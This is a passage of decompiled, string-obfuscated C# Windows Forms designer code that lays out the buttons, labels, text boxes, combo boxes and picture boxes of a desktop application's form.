		((Control)label21).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3D61C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)button4).BackColor = Color.MediumOrchid;
		((Control)button4).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2875DAAD ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c07131ca78724f7dbfd5c111b94d27a3), 10f, (FontStyle)1);
		((Control)button4).ForeColor = SystemColors.ControlLightLight;
		((Control)button4).Location = new Point(488, 607);
		((Control)button4).Margin = new Padding(5, 3, 5, 3);
		((Control)button4).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12235DD6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_fea9b05f02bd4e4abbe97e02da99e90b);
		((Control)button4).Size = new Size(107, 27);
		((Control)button4).TabIndex = 51;
		((Control)button4).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF1B7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((ButtonBase)button4).UseVisualStyleBackColor = false;
		((Control)button4).Click += button4_Click_1;
		comboBox3.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox3).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC615C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8), 10f, (FontStyle)1);
		((ListControl)comboBox3).FormattingEnabled = true;
		((Control)comboBox3).Location = new Point(240, 610);
		((Control)comboBox3).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E91F63 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)comboBox3).Size = new Size(241, 24);
		((Control)comboBox3).TabIndex = 50;
		comboBox3.SelectedIndexChanged += comboBox3_SelectedIndexChanged;
		comboBox2.DropDownStyle = (ComboBoxStyle)2;
		((Control)comboBox2).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x694609F7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_45f3ae80ba3140afaf29a3f1d417534f), 10f, (FontStyle)1);
		((ListControl)comboBox2).FormattingEnabled = true;
		((Control)comboBox2).Location = new Point(10, 610);
		((Control)comboBox2).Margin = new Padding(5, 3, 5, 3);
		((Control)comboBox2).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F71AB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((Control)comboBox2).Size = new Size(223, 24);
		((Control)comboBox2).TabIndex = 49;
		comboBox2.SelectedIndexChanged += comboBox2_SelectedIndexChanged;
		((Control)textBox8).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F6A3D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc), 10f, (FontStyle)1);
		((Control)textBox8).Location = new Point(178, 555);
		((Control)textBox8).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB5B95 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e);
		((Control)textBox8).Size = new Size(100, 23);
		((Control)textBox8).TabIndex = 47;
		((Control)textBox8).TextChanged += textBox8_TextChanged;
		((Control)textBox7).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x7E5A35C2 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76), 10f, (FontStyle)1);
		((Control)textBox7).Location = new Point(284, 555);
		((Control)textBox7).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC901F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a);
		((Control)textBox7).Size = new Size(203, 23);
		((Control)textBox7).TabIndex = 46;
		((Control)textBox7).TextChanged += textBox7_TextChanged;
		((Control)textBox6).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5BBB4015 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_57a6661532394af0a3862bba53f2036e), 10f, (FontStyle)1);
		((Control)textBox6).Location = new Point(493, 555);
		((Control)textBox6).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C28BC6 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290);
		((Control)textBox6).Size = new Size(100, 23);
		((Control)textBox6).TabIndex = 45;
		((Control)textBox6).TextChanged += textBox6_TextChanged;
		((Control)label20).AutoSize = true;
		((Control)label20).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C2909E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290), 10f, (FontStyle)1);
		((Control)label20).ForeColor = SystemColors.ControlLightLight;
		((Control)label20).Location = new Point(10, 592);
		((Control)label20).Margin = new Padding(5, 0, 5, 0);
		((Control)label20).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0x538252AB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb);
		((Control)label20).Size = new Size(77, 16);
		((Control)label20).TabIndex = 44;
		((Control)label20).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x11ADDB5 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0297d3947c2a44f3845616d12eba22f2);
		((Control)label19).AutoSize = true;
		((Control)label19).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x678FB09D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cb7647541f7e40c28d7e073386e0f7fa), 10f, (FontStyle)1);
		((Control)label19).ForeColor = SystemColors.ControlLightLight;
		((Control)label19).Location = new Point(237, 592);
		((Control)label19).Margin = new Padding(5, 0, 5, 0);
		((Control)label19).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x477E7F6C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label19).Size = new Size(45, 16);
		((Control)label19).TabIndex = 43;
		((Control)label19).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2A70C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((Control)label18).AutoSize = true;
		((Control)label18).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46BC8BB3 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_7539847744bb4f3f89a249de2658ea6a), 10f, (FontStyle)1);
		((Control)label18).ForeColor = SystemColors.ControlLightLight;
		((Control)label18).Location = new Point(488, 592);
		((Control)label18).Margin = new Padding(5, 0, 5, 0);
		((Control)label18).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA31361 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee);
		((Control)label18).Size = new Size(102, 16);
		((Control)label18).TabIndex = 42;
		((Control)label18).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7FC91178 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f6b54f43bc5c4099a4aa9b9155cdd47a);
		((Control)label17).AutoSize = true;
		((Control)label17).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20C2909E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_c8141a8b72aa44b3a664e8c4a2731290), 10f, (FontStyle)1);
		((Control)label17).ForeColor = SystemColors.ControlLightLight;
		((Control)label17).Location = new Point(176, 536);
		((Control)label17).Margin = new Padding(5, 0, 5, 0);
		((Control)label17).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0xD9F2457 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0833f608dcca449f93bb40a86263840a);
		((Control)label17).Size = new Size(33, 16);
		((Control)label17).TabIndex = 41;
		((Control)label17).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF0B1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)label16).AutoSize = true;
		((Control)label16).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x24C407E ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_f21b1171952f4cd2aae5d7be2be94970), 10f, (FontStyle)1);
		((Control)label16).ForeColor = SystemColors.ControlLightLight;
		((Control)label16).Location = new Point(282, 536);
		((Control)label16).Margin = new Padding(5, 0, 5, 0);
		((Control)label16).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x12711182 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		((Control)label16).Size = new Size(50, 16);
		((Control)label16).TabIndex = 40;
		((Control)label16).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-2083794465 ^ -685584436 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label15).AutoSize = true;
		((Control)label15).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x10ACB9DB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6ae29e5e756542b6a6630ad169e9dc76), 10f, (FontStyle)1);
		((Control)label15).ForeColor = SystemColors.ControlLightLight;
		((Control)label15).Location = new Point(490, 536);
		((Control)label15).Margin = new Padding(5, 0, 5, 0);
		((Control)label15).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54045B09 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d2a5bdc84a4644acb5d9fa871e9d89cc);
		((Control)label15).Size = new Size(70, 16);
		((Control)label15).TabIndex = 39;
		((Control)label15).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x54E91E35 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_be6aa5f9bc844d2098a21bb598f8ce61);
		((Control)label14).AutoSize = true;
		((Control)label14).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x3A6392D1 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a1a7f7f522cd4535b40d954ec9f98427), 10f, (FontStyle)1);
		((Control)label14).ForeColor = SystemColors.ControlLightLight;
		((Control)label14).Location = new Point(10, 536);
		((Control)label14).Margin = new Padding(5, 0, 5, 0);
		((Control)label14).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE76E0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((Control)label14).Size = new Size(43, 16);
		((Control)label14).TabIndex = 38;
		((Control)label14).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BF85B8 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_6e6f96868e8e46d3959156c0871dafbc);
		((Control)textBox5).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1646586438 ^ -994579288 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_e38ac3b620fc42ae863103cddbe6a1eb), 10f, (FontStyle)1);
		((Control)textBox5).Location = new Point(404, 493);
		((Control)textBox5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF00D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)textBox5).Size = new Size(191, 23);
		((Control)textBox5).TabIndex = 37;
		((Control)textBox5).TextChanged += textBox5_TextChanged;
		((Control)textBox3).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC615C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8), 10f, (FontStyle)1);
		((Control)textBox3).Location = new Point(207, 493);
		((Control)textBox3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x74DB2327 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_904c7ffdb8fc47b685c80da894c6344f);
		((Control)textBox3).Size = new Size(191, 23);
		((Control)textBox3).TabIndex = 36;
		((Control)textBox3).TextChanged += textBox3_TextChanged;
		((Control)textBox1).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x50BCBB04 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6), 10f, (FontStyle)1);
		((Control)textBox1).Location = new Point(10, 493);
		((Control)textBox1).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC7B42 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8);
		((Control)textBox1).Size = new Size(191, 23);
		((Control)textBox1).TabIndex = 35;
		((Control)textBox1).TextChanged += textBox1_TextChanged;
		((Control)label13).AutoSize = true;
		((Control)label13).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x42FE9806 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_ce14555c8e314f729d5e754b0132dafe), 10f, (FontStyle)1);
		((Control)label13).ForeColor = SystemColors.ControlLightLight;
		((Control)label13).Location = new Point(402, 473);
		((Control)label13).Margin = new Padding(5, 0, 5, 0);
		((Control)label13).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5ADE764C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d06723451b644b929e3ffec494e31c68);
		((Control)label13).Size = new Size(79, 16);
		((Control)label13).TabIndex = 34;
		((Control)label13).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x13741065 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_5c341600f0874de8892147931a071d76);
		((Control)label12).AutoSize = true;
		((Control)label12).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B7188C0 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_d4486f79952142cc9aa30d377c51de33), 10f, (FontStyle)1);
		((Control)label12).ForeColor = SystemColors.ControlLightLight;
		((Control)label12).Location = new Point(202, 473);
		((Control)label12).Margin = new Padding(5, 0, 5, 0);
		((Control)label12).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x69F8DF20 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_aa05297beeb84923a95217091581509e);
		((Control)label12).Size = new Size(98, 16);
		((Control)label12).TabIndex = 33;
		((Control)label12).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x75BC7C8C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_cdcebee94fe242b1b3cd47154bb8d2f8);
		((Control)label3).AutoSize = true;
		((Control)label3).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x7DC10E92 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a0a12e2948a64c7f9bea608a6f866e06), 10f, (FontStyle)1);
		((Control)label3).ForeColor = SystemColors.ControlLightLight;
		((Control)label3).Location = new Point(10, 473);
		((Control)label3).Margin = new Padding(5, 0, 5, 0);
		((Control)label3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA315AB ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee);
		((Control)label3).Size = new Size(82, 16);
		((Control)label3).TabIndex = 32;
		((Control)label3).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1271168A ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0c4c677f3d944d45ac3d891fa87fcac2);
		pictureBox8.BorderStyle = (BorderStyle)2;
		((Control)pictureBox8).Enabled = false;
		((Control)pictureBox8).Location = new Point(957, 55);
		((Control)pictureBox8).Margin = new Padding(0);
		((Control)pictureBox8).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3D3B4 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((Control)pictureBox8).Size = new Size(275, 356);
		pictureBox8.SizeMode = (PictureBoxSizeMode)4;
		pictureBox8.TabIndex = 31;
		pictureBox8.TabStop = false;
		((Control)pictureBox8).Click += pictureBox8_Click;
		pictureBox7.BorderStyle = (BorderStyle)2;
		((Control)pictureBox7).Enabled = false;
		((Control)pictureBox7).Location = new Point(762, 56);
		((Control)pictureBox7).Margin = new Padding(0);
		((Control)pictureBox7).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x46A2AC7B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_0cbf980cef9f4f6d841f2b5e631058fc);
		((Control)pictureBox7).Size = new Size(186, 322);
		pictureBox7.SizeMode = (PictureBoxSizeMode)4;
		pictureBox7.TabIndex = 30;
		pictureBox7.TabStop = false;
		((Control)pictureBox7).Click += pictureBox7_Click;
		pictureBox3.BorderStyle = (BorderStyle)2;
		((Control)pictureBox3).Enabled = false;
		((Control)pictureBox3).Location = new Point(561, 56);
		((Control)pictureBox3).Margin = new Padding(0);
		((Control)pictureBox3).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x17DF2208 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_65959cbbae0e4d08b8072ed54d2c0e5a);
		((Control)pictureBox3).Size = new Size(186, 322);
		pictureBox3.SizeMode = (PictureBoxSizeMode)4;
		pictureBox3.TabIndex = 29;
		pictureBox3.TabStop = false;
		((Control)pictureBox3).Click += pictureBox3_Click_1;
		pictureBox6.BorderStyle = (BorderStyle)2;
		((Control)pictureBox6).Enabled = false;
		((Control)pictureBox6).Location = new Point(251, 229);
		((Control)pictureBox6).Margin = new Padding(0);
		((Control)pictureBox6).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x61A2A146 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_621150a557c546b580524d1b82f4f675);
		((Control)pictureBox6).Size = new Size(294, 148);
		pictureBox6.SizeMode = (PictureBoxSizeMode)4;
		pictureBox6.TabIndex = 28;
		pictureBox6.TabStop = false;
		((Control)pictureBox6).Click += pictureBox6_Click;
		((Control)button16).BackColor = Color.Green;
		((Control)button16).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x6F7277BA ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2b8c33c9b9eb4979870d40c63f7b4165), 10f, (FontStyle)1);
		((Control)button16).ForeColor = SystemColors.ControlLightLight;
		((Control)button16).Location = new Point(10, 443);
		((Control)button16).Margin = new Padding(5, 3, 5, 3);
		((Control)button16).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4B3DF72D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_70799b9eb9474c3b9c4b685f65883782);
		((Control)button16).Size = new Size(151, 23);
		((Control)button16).TabIndex = 24;
		((Control)button16).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x1CB3D328 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8d38eba5cedc4c1fa516f3280fa0cc49);
		((ButtonBase)button16).UseVisualStyleBackColor = false;
		((Control)button16).Click += button16_Click;
		((Control)button15).BackColor = Color.Green;
		((Control)button15).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x4DA3085D ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_8350575ae23c47268ab6d6a27e6944ee), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button15).ForeColor = SystemColors.ControlLightLight;
		((Control)button15).Location = new Point(10, 39);
		((Control)button15).Margin = new Padding(5, 3, 5, 3);
		((Control)button15).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(--1831747487 ^ 0x4FDF86A7 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_69dd1a730f2a42979206d319258f7586);
		((Control)button15).Size = new Size(186, 38);
		((Control)button15).TabIndex = 23;
		((Control)button15).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x387F772F ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_903c9fa40f3d4d0fb3bcd63cbccd82bc);
		((ButtonBase)button15).UseVisualStyleBackColor = false;
		((Control)button15).Click += button15_Click;
		((Control)label11).AutoSize = true;
		((Control)label11).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x20A10943 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_53033b46cc2d41edad0c17b7fd0897bc), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label11).ForeColor = SystemColors.ControlLightLight;
		((Control)label11).Location = new Point(10, 362);
		((Control)label11).Margin = new Padding(5, 0, 5, 0);
		((Control)label11).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(-1148833791 ^ -348482009 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_baadfbd8c0914381a19d37bd12cce8f6);
		((Control)label11).Size = new Size(89, 19);
		((Control)label11).TabIndex = 22;
		((Control)label11).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x608EA5EC ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_437346f465ec4c2688d96b0e0f9b04a9);
		pictureBox5.BorderStyle = (BorderStyle)2;
		((Control)pictureBox5).Location = new Point(10, 384);
		((Control)pictureBox5).Margin = new Padding(5, 3, 5, 3);
		((Control)pictureBox5).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x5C296A8B ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b);
		((Control)pictureBox5).Size = new Size(236, 53);
		pictureBox5.SizeMode = (PictureBoxSizeMode)1;
		pictureBox5.TabIndex = 21;
		pictureBox5.TabStop = false;
		((Control)pictureBox5).Click += pictureBox5_Click;
		((Control)button14).BackColor = Color.FromArgb(64, 64, 64);
		((Control)button14).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--328687871 ^ 0x4FBE168C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_316b0d76d3564b3192cf4837ca11a51b), 10f, (FontStyle)1);
		((Control)button14).ForeColor = SystemColors.ControlLightLight;
		((Control)button14).Location = new Point(162, 443);
		((Control)button14).Margin = new Padding(5, 3, 5, 3);
		((Control)button14).Name = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x2B77CA0C ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_2d06329f1bd54c2287b4ec6435bc1344);
		((Control)button14).Size = new Size(84, 23);
		((Control)button14).TabIndex = 20;
		((Control)button14).Text = gBMthepoZSL1ZVKpeA.wsO7HTGYd(0x589A5F60 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_a578ede9d9414aabbdcf1d01b7348baf);
		((ButtonBase)button14).UseVisualStyleBackColor = false;
		((Control)button14).Click += button14_Click;
		((Control)button13).BackColor = Color.MediumOrchid;
		((Control)button13).Font = new Font(gBMthepoZSL1ZVKpeA.wsO7HTGYd(--183415037 ^ 0xBC66623 ^ _003CModule_003E_007B863be807_002D2793_002D43c1_002Db2ae_002D2b6e9e545c2e_007D.m_434d0e3d002c422dbb7171f7dd721a59.m_807d1b955a4f4b29a5cb4b57c2d18bc3), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button13).ForeColor = SystemColors.ControlLightLight;
